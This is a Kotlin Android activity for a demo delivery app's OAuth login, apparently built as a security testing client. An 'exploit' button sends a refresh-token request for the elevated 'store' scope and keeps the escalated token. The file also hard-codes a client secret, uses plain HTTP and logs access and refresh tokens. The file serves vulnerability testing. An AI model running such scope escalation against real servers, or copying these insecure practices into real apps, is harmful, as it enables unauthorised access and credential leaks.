package com.example.deliveryapp

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import net.openid.appauth.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var authService: AuthorizationService
    private lateinit var authStateManager: AuthStateManager

    // OAuth Configuration
    private val AUTH_SERVER_URL = "http://10.210.130.19:3000"  // localhost for emulator (10.0.2.2 = host machine)
    private val CLIENT_ID = "android_app_client"
    private val CLIENT_SECRET = "secret123"
    private val REDIRECT_URI = "com.example.deliveryapp://oauth2callback"

    companion object {
        private const val TAG = "MainActivity"
        private const val RC_AUTH = 100
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Allow insecure HTTP connections for testing
        val appAuthConfig = AppAuthConfiguration.Builder()
            .setConnectionBuilder { uri ->
                val url = java.net.URL(uri.toString())
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.instanceFollowRedirects = false
                conn
            }
            .build()

        authService = AuthorizationService(this, appAuthConfig)
        authStateManager = AuthStateManager.getInstance(this)

        // Check if already logged in
        if (authStateManager.current.isAuthorized) {
            Log.d(TAG, "Already logged in, navigating to dashboard")
            navigateToDashboard()
            return
        }

        setupUI()
    }

    private fun setupUI() {
        findViewById<Button>(R.id.btnLoginCustomer).setOnClickListener {
            startOAuthLogin("customer")
        }

        findViewById<Button>(R.id.btnLoginStore).setOnClickListener {
            startOAuthLogin("store")
        }

        // VULNERABILITY EXPLOIT BUTTON
        findViewById<Button>(R.id.btnExploitVulnerability).setOnClickListener {
            exploitScopeEscalation()
        }
    }

    private fun startOAuthLogin(scope: String) {
        val serviceConfig = AuthorizationServiceConfiguration(
            Uri.parse("$AUTH_SERVER_URL/oauth/authorize"),  // authorization endpoint
            Uri.parse("$AUTH_SERVER_URL/oauth/token")        // token endpoint
        )

        val authRequestBuilder = AuthorizationRequest.Builder(
            serviceConfig,
            CLIENT_ID,
            ResponseTypeValues.CODE,
            Uri.parse(REDIRECT_URI)
        ).setScope(scope)

        // Enable PKCE
        val authRequest = authRequestBuilder.build()

        val authIntent = authService.getAuthorizationRequestIntent(authRequest)
        startActivityForResult(authIntent, RC_AUTH)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == RC_AUTH) {
            val response = AuthorizationResponse.fromIntent(data!!)
            val ex = AuthorizationException.fromIntent(data)

            if (response != null) {
                Log.d(TAG, "Authorization successful, exchanging code for token")
                exchangeAuthorizationCode(response)
            } else {
                Log.e(TAG, "Authorization failed: ${ex?.error}")
                Toast.makeText(this, "Login failed: ${ex?.error}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun exchangeAuthorizationCode(authResponse: AuthorizationResponse) {
        val tokenRequest = authResponse.createTokenExchangeRequest()

        authService.performTokenRequest(tokenRequest) { tokenResponse, exception ->
            runOnUiThread {
                if (tokenResponse != null) {
                    Log.d(TAG, "Token exchange successful")
                    Log.d(TAG, "Access Token: ${tokenResponse.accessToken}")
                    Log.d(TAG, "Refresh Token: ${tokenResponse.refreshToken}")
                    Log.d(TAG, "Scope: ${tokenResponse.scope}")

                    // Save auth state
                    val authState = AuthState(authResponse, tokenResponse, exception)
                    authStateManager.replace(authState)

                    Toast.makeText(this, "Login successful!", Toast.LENGTH_SHORT).show()
                    navigateToDashboard()
                } else {
                    Log.e(TAG, "Token exchange failed", exception)
                    Toast.makeText(this, "Token exchange failed", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    // VULNERABILITY: Scope Escalation via Refresh Token
    private fun exploitScopeEscalation() {
        val authState = authStateManager.current

        if (!authState.isAuthorized || authState.refreshToken == null) {
            Toast.makeText(this, "Please login first", Toast.LENGTH_SHORT).show()
            return
        }

        val currentScope = authState.scope ?: "unknown"
        Log.d(TAG, "🚨 EXPLOIT: Current scope = $currentScope")
        Log.d(TAG, "🚨 EXPLOIT: Attempting to escalate to 'store' scope")

        // Create refresh token request with elevated scope
        val client = OkHttpClient()
        val formBody = FormBody.Builder()
            .add("grant_type", "refresh_token")
            .add("refresh_token", authState.refreshToken!!)
            .add("scope", "store")  // 🚨 VULNERABILITY: Request store scope!
            .add("client_id", CLIENT_ID)
            .add("client_secret", CLIENT_SECRET)
            .build()

        val request = Request.Builder()
            .url("$AUTH_SERVER_URL/oauth/token")
            .post(formBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    Log.e(TAG, "🚨 EXPLOIT FAILED: Network error", e)
                    Toast.makeText(
                        this@MainActivity,
                        "Exploit failed: ${e.message}",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val responseBody = response.body?.string()
                runOnUiThread {
                    if (response.isSuccessful && responseBody != null) {
                        val json = JSONObject(responseBody)
                        val newScope = json.getString("scope")
                        val newAccessToken = json.getString("access_token")

                        Log.d(TAG, "🎯 EXPLOIT SUCCESS!")
                        Log.d(TAG, "🎯 Old scope: $currentScope")
                        Log.d(TAG, "🎯 New scope: $newScope")
                        Log.d(TAG, "🎯 New access token: $newAccessToken")

                        // Update auth state with elevated token
                        val tokenResponse = TokenResponse.Builder(authState.lastTokenResponse!!.request)
                            .setAccessToken(newAccessToken)
                            .setRefreshToken(json.optString("refresh_token"))
                            .setTokenType("Bearer")
                            .setScope(newScope)
                            .build()

                        val newAuthState = AuthState(
                            authState.lastAuthorizationResponse!!,
                            tokenResponse,
                            null
                        )
                        authStateManager.replace(newAuthState)

                        Toast.makeText(
                            this@MainActivity,
                            "🚨 권한 상승 성공! $currentScope → $newScope",
                            Toast.LENGTH_LONG
                        ).show()

                        // Navigate to dashboard to test elevated privileges
                        navigateToDashboard()
                    } else {
                        Log.e(TAG, "🚨 EXPLOIT FAILED: $responseBody")
                        Toast.makeText(
                            this@MainActivity,
                            "Exploit failed: ${response.code}",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }
            }
        })
    }

    private fun navigateToDashboard() {
        val intent = Intent(this, DashboardActivity::class.java)
        startActivity(intent)
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        authService.dispose()
    }
}
